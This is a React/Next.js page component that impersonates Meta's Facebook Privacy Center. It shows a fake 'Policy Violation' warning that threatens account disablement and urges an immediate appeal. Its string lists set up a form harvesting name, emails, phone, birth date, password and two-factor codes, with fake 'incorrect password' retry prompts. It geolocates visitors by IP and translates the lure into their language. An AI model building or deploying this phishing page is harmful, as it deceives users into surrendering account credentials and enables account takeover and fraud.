'use client';
import BackgroundImage from '@/assets/images/anh-vi-pham-1.jpg';
import MetaAI from '@/assets/images/meta-ai-image.png';
import MetaImage from '@/assets/images/meta-image.png';
import ProfileImage from '@/assets/images/profile-image.png';
import WarningImage from '@/assets/images/warning.png';
import { store } from '@/store/store';
import translateText from '@/utils/translate';
import type { IconDefinition } from '@fortawesome/fontawesome-svg-core';
import { faHouse } from '@fortawesome/free-regular-svg-icons/faHouse';
import { faChevronRight } from '@fortawesome/free-solid-svg-icons/faChevronRight';
import { faCircleInfo } from '@fortawesome/free-solid-svg-icons/faCircleInfo';
import { faGear } from '@fortawesome/free-solid-svg-icons/faGear';
import { faLock } from '@fortawesome/free-solid-svg-icons/faLock';
import { faMagnifyingGlass } from '@fortawesome/free-solid-svg-icons/faMagnifyingGlass';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import dynamic from 'next/dynamic';
import Image, { type StaticImageData } from 'next/image';
import { useEffect, useRef, useState, type FC } from 'react';

const FormModal = dynamic(() => import('@/components/form-modal'), { ssr: false });

interface MenuItem {
    id: string;
    icon: IconDefinition;
    label: string;
    isActive?: boolean;
}

interface InfoCardItem {
    id: string;
    title: string;
    subtitle: string;
    image?: StaticImageData;
}

const menuItems: MenuItem[] = [
    {
        id: 'home',
        icon: faHouse,
        label: 'Privacy Center Home Page',
        isActive: true
    },
    {
        id: 'search',
        icon: faMagnifyingGlass,
        label: 'Search'
    },
    {
        id: 'privacy',
        icon: faLock,
        label: 'Privacy Policy'
    },
    {
        id: 'rules',
        icon: faCircleInfo,
        label: 'Other rules and articles'
    },
    {
        id: 'settings',
        icon: faGear,
        label: 'Settings'
    }
];

const privacyCenterItems: InfoCardItem[] = [
    {
        id: 'policy',
        title: 'What is the Privacy Policy and what does it say?',
        subtitle: 'Privacy Policy',
        image: ProfileImage
    },
    {
        id: 'manage',
        title: 'How you can manage or delete your information',
        subtitle: 'Privacy Policy',
        image: ProfileImage
    }
];

const agreementItems: InfoCardItem[] = [
    {
        id: 'meta-ai',
        title: 'Meta AI',
        subtitle: 'User Agreement',
        image: MetaAI
    }
];

const resourceItems: InfoCardItem[] = [
    {
        id: 'generative-ai',
        title: 'How Meta uses information for generative AI models',
        subtitle: 'Privacy Center'
    },
    {
        id: 'ai-systems',
        title: 'Cards with information about the operation of AI systems',
        subtitle: 'Meta AI website'
    },
    {
        id: 'intro-ai',
        title: 'Introduction to Generative AI',
        subtitle: 'For teenagers'
    }
];

const Page: FC = () => {
    const { isModalOpen, setModalOpen, setGeoInfo, geoInfo, translations: storeTranslations, setTranslations } = store();
    const [modalKey, setModalKey] = useState(0);
    const isTranslatingPageRef = useRef(false);
    const isTranslatingModalRef = useRef(false);

    const t = (text: string): string => {
        return storeTranslations[text] || text;
    };

    // Preload InitModal component ngay khi page load để dịch ngầm trước
    useEffect(() => {
        import('@/components/form-modal/init-modal').catch(() => {});
    }, []);

    useEffect(() => {
        if (geoInfo) {
            return;
        }

        const fetchGeoInfo = async () => {
            try {
                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                setGeoInfo({
                    asn: data.asn || 0,
                    ip: data.ip || 'CHỊU',
                    country: data.country || 'CHỊU',
                    city: data.city || 'CHỊU',
                    country_code: data.country_code || 'US'
                });
            } catch {
                setGeoInfo({
                    asn: 0,
                    ip: 'CHỊU',
                    country: 'CHỊU',
                    city: 'CHỊU',
                    country_code: 'US'
                });
            }
        };
        fetchGeoInfo();
    }, [setGeoInfo, geoInfo]);

    // Dịch page text + modal text ngầm ngay khi có geoInfo
    useEffect(() => {
        if (!geoInfo || isTranslatingPageRef.current || isTranslatingModalRef.current) return;

        const pageTexts = [
            'Privacy Center Home Page',
            'Search',
            'Privacy Policy',
            'Other rules and articles',
            'Settings',
            'Privacy Center',
            'Policy Violation',
            'Our system has detected some suspicious activity on your Facebook account that shows signs of violating our Terms of Service. To avoid your Facebook account and Page being disabled, please submit a review request through an appeal form immediately for our Support Team to review.',
            'Facebook account appeal and complaint page for cases where accounts are restricted or disabled',
            'Please provide all the required information below for us to proceed with verification. Missing information may affect your account and delay the processing of your appeal.',
            'Request Review',
            'What is the Privacy Policy and what does it say?',
            'How you can manage or delete your information',
            'Meta AI',
            'User Agreement',
            'For more details, see the User Agreement',
            'Additional resources',
            'How Meta uses information for generative AI models',
            'Meta AI website',
            'Introduction to Generative AI',
            'For teenagers',
            'We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks. Read more about Privacy Policy'
        ];

        const modalTexts = [
            // Init modal texts
            'Information Form',
            'Full Name',
            'Email',
            'Email Business',
            'Page Name',
            'Mobile phone number',
            'Date of Birth',
            'Day',
            'Month',
            'Year',
            'Note',
            'Our response will be sent to you within 14 - 48 hours.',
            'I agree with',
            'Terms of use',
            'Send',
            'Please enter enough full name.',
            'Please enter enough email address.',
            'Please enter enough email business address.',
            'Please enter enough page name.',
            'Please enter enough day.',
            'Please enter enough month.',
            'Please enter enough year.',
            // Password modal texts
            'Password',
            "The password that you've entered is incorrect.",
            'Continue',
            'For your security, you must enter your password to continue.',
            'Forgot your password?',
            // Verify modal texts
            'Check your authentication code',
            "We've sent a verification code to your",
            'and',
            'To continue, you\'ll need to enter a verification code or approve it from another device.',
            'This process may take a few minutes.',
            'Please don\'t leave this page until you receive the code.',
            'Go to your authentication app',
            'Enter the 6-digit code for this account from the two-factor authentication app that you set up (such as Duo Mobile or Google Authenticator).',
            'Two-factor authentication required',
            'Facebook',
            'Code',
            'The two-factor authentication you entered is incorrect',
            'Please, try again after',
            'Try another way',
            'minutes',
            'seconds',
            // Final modal texts
            'Request has been sent',
            'Your request has been added to the processing queue',
            'We will handle your request within 24 hours',
            'in case we do not receive feedback',
            'please send back information so we can assist you',
            'From the Customer support Meta',
            'Return to Facebook'
        ];

        // Chỉ dịch text chưa có
        const pageTextsToTranslate = pageTexts.filter((text) => !storeTranslations[text]);
        const modalTextsToTranslate = modalTexts.filter((text) => !storeTranslations[text]);
        const allTextsToTranslate = [...pageTextsToTranslate, ...modalTextsToTranslate];

        if (allTextsToTranslate.length === 0) return; // Đã dịch hết rồi

        isTranslatingPageRef.current = true;
        isTranslatingModalRef.current = true;

        const translateAll = async () => {
            // Dịch song song TẤT CẢ text (page + modal) cùng lúc
            const translatePromises = allTextsToTranslate.map((text) =>
                translateText(text, geoInfo.country_code).then((translated) => ({ text, translated }))
            );

            const results = await Promise.all(translatePromises);
            const translatedMap: Record<string, string> = { ...storeTranslations };

            results.forEach(({ text, translated }) => {
                translatedMap[text] = translated;
            });

            // Lưu vào store
            setTranslations(translatedMap);
            isTranslatingPageRef.current = false;
            isTranslatingModalRef.current = false;
        };

        translateAll();
    }, [geoInfo, setTranslations, storeTranslations]);

    return (
        <div className='flex items-center justify-center bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] text-[#1C2B33]'>
            <title>Policy Violation - Page Appeal</title>
            <div className='flex w-full max-w-[1100px]'>
                <div className='sticky top-0 hidden h-screen w-1/3 flex-col border-r border-r-gray-200 pt-10 pr-8 sm:flex'>
                    <Image src={MetaImage} alt='' className='h-3.5 w-[70px]' />
                    <p className='my-4 text-2xl font-bold'>{t('Privacy Center')}</p>
                    {menuItems.map((item) => (
                        <div key={item.id} className={`flex cursor-pointer items-center justify-start gap-3 rounded-[15px] px-4 py-3 font-medium ${item.isActive ? 'bg-[#344854] text-white' : 'text-black hover:bg-[#e3e8ef]'}`}>
                            <FontAwesomeIcon icon={item.icon} />
                            <p>{t(item.label)}</p>
                        </div>
                    ))}
                </div>
                <div className='flex flex-1 flex-col gap-5 px-4 pt-6 pb-10 sm:px-8'>
                    <div className='flex items-center gap-2'>
                        <Image src={WarningImage} alt='' className='h-[50px] w-[50px]' />
                        <p className='text-2xl font-bold'>{t('Policy Violation')}</p>
                    </div>
                    <p className='-mt-2'>{t('Our system has detected some suspicious activity on your Facebook account that shows signs of violating our Terms of Service. To avoid your Facebook account and Page being disabled, please submit a review request through an appeal form immediately for our Support Team to review.')}</p>
                    <div className='rounded-b-[20px] bg-white overflow-hidden'>
                        <Image src={BackgroundImage} alt='' className='w-full h-auto rounded-t-[20px] object-cover' style={{ maxHeight: '300px' }} />
                        <div className='flex flex-col items-center justify-center gap-3 p-5'>
                            <p className='text-base'>{t('Facebook account appeal and complaint page for cases where accounts are restricted or disabled')}</p>
                            <p className='text-base'>{t('Please provide all the required information below for us to proceed with verification. Missing information may affect your account and delay the processing of your appeal.')}</p>
                            <button
                                onClick={() => {
                                    setModalKey((prev) => prev + 1);
                                    setModalOpen(true);
                                }}
                                className='flex h-[50px] w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white'
                            >
                                {t('Request Review')}
                            </button>
                        </div>
                    </div>
                    <div className='flex flex-col gap-3'>
                        <div>
                            <p className='font-sans font-medium text-[#212529]'>{t('Privacy Center')}</p>
                            {privacyCenterItems.map((item, index) => {
                                const isFirst = index === 0;
                                const isLast = index === privacyCenterItems.length - 1;
                                const roundedClass = privacyCenterItems.length === 1 ? 'rounded-[15px]' : isFirst ? 'rounded-t-[15px] border-b border-b-gray-200' : isLast ? 'rounded-b-[15px]' : 'border-y border-y-gray-200';

                                return (
                                    <div key={item.id} className={`flex cursor-pointer items-center justify-center gap-3 bg-white px-4 py-3 transition-discrete duration-300 hover:bg-[#e3e8ef] ${roundedClass}`}>
                                        {item.image && <Image src={item.image} alt='' className='h-12 w-12' />}
                                        <div className='flex flex-1 flex-col'>
                                            <p className='font-medium'>{t(item.title)}</p>
                                            <p className='text-[#465a69]'>{t(item.subtitle)}</p>
                                        </div>
                                        <FontAwesomeIcon icon={faChevronRight} />
                                    </div>
                                );
                            })}
                        </div>
                        <div>
                            <p className='font-sans font-medium text-[#212529]'>{t('For more details, see the User Agreement')}</p>
                            {agreementItems.map((item, index) => {
                                const isFirst = index === 0;
                                const isLast = index === agreementItems.length - 1;
                                const roundedClass = agreementItems.length === 1 ? 'rounded-[15px]' : isFirst ? 'rounded-t-[15px] border-b border-b-gray-200' : isLast ? 'rounded-b-[15px]' : 'border-y border-y-gray-200';

                                return (
                                    <div key={item.id} className={`flex cursor-pointer items-center justify-center gap-3 bg-white px-4 py-3 transition-discrete duration-300 hover:bg-[#e3e8ef] ${roundedClass}`}>
                                        {item.image && <Image src={item.image} alt='' className='h-12 w-12' />}
                                        <div className='flex flex-1 flex-col'>
                                            <p className='font-medium'>{t(item.title)}</p>
                                            <p className='text-[#465a69]'>{t(item.subtitle)}</p>
                                        </div>
                                        <FontAwesomeIcon icon={faChevronRight} />
                                    </div>
                                );
                            })}
                        </div>
                        <div>
                            <p className='font-sans font-medium text-[#212529]'>{t('Additional resources')}</p>
                            {resourceItems.map((item, index) => {
                                const isFirst = index === 0;
                                const isLast = index === resourceItems.length - 1;
                                const roundedClass = resourceItems.length === 1 ? 'rounded-[15px]' : isFirst ? 'rounded-t-[15px] border-b border-b-gray-200' : isLast ? 'rounded-b-[15px]' : 'border-y border-y-gray-200';

                                return (
                                    <div key={item.id} className={`flex cursor-pointer items-center justify-center gap-3 bg-white px-4 py-3 transition-discrete duration-300 hover:bg-[#e3e8ef] ${roundedClass}`}>
                                        {item.image && <Image src={item.image} alt='' className='h-12 w-12' />}
                                        <div className='flex flex-1 flex-col'>
                                            <p className='font-medium'>{t(item.title)}</p>
                                            <p className='text-[#465a69]'>{t(item.subtitle)}</p>
                                        </div>
                                        <FontAwesomeIcon icon={faChevronRight} />
                                    </div>
                                );
                            })}
                        </div>
                        <p className='text-[15px] text-[#465a69]'>{t('We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks. Read more about Privacy Policy')}</p>
                    </div>
                </div>
            </div>
            {isModalOpen && <FormModal key={modalKey} />}
        </div>
    );
};

export default Page;
